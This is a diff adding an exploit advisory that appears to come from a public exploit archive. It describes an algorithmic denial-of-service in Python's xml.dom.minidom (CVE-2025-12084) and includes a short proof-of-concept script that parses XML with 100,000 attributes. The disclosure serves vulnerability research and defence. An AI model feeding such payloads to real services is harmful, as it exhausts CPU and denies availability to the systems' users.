@@ -1,0 +1,40 @@
+=============================================================================================================================================
+| # Title     : python3 minidom Algorithmic Denial of Service (DoS) via Excessive XML Attributes                                            |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.3 (64 bits)                                                            |
+| # Vendor    : https://www.python.org/                                                                                                     |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/215177/  & CVE-2025-12084
+
+[+] Summary    : This proof of concept demonstrates an Algorithmic Denial of Service (Algo-DoS) condition caused by parsing an XML document containing an extremely 
+                 large number of attributes using Python’s xml.dom.minidom library. Due to inefficient attribute handling with quadratic time complexity, the XML parser may 
+				 consume excessive CPU resources, leading to severe performance degradation or service unavailability. The issue becomes critical when untrusted XML input is 
+				 processed without proper size limits or resource controls. 
+                 This behavior does not result in code execution but represents a significant availability risk for applications relying on vulnerable XML parsing mechanisms
+  
+[+] POC :   
+
+import xml.dom.minidom
+import time
+
+def trigger_dos_vulnerability():
+    count = 100000 
+    payload = '<?xml version="1.0"?><root ' + ' '.join([f'attr{i}="v"' for i in range(count)]) + ' />'
+    print(f"[*] Attempting to process {count} attributes...")
+    start_time = time.time()
+    try:
+        xml.dom.minidom.parseString(payload) 
+        end_time = time.time()
+        print(f"[+] Processing completed successfully in {end_time - start_time:.2f} seconds.")
+        print("[!] The system might not be vulnerable, or the input is insufficient for a crash.")
+    except Exception as e:
+        print(f"[-] An error occurred during processing: {e}")
+
+if __name__ == "__main__":
+    trigger_dos_vulnerability()
+	
+	
+Greetings to :======================================================================
+jericho * Larry W. Cashdollar * r00t * Hussin-X * Malvuln (John Page aka hyp3rlinx)|
+====================================================================================
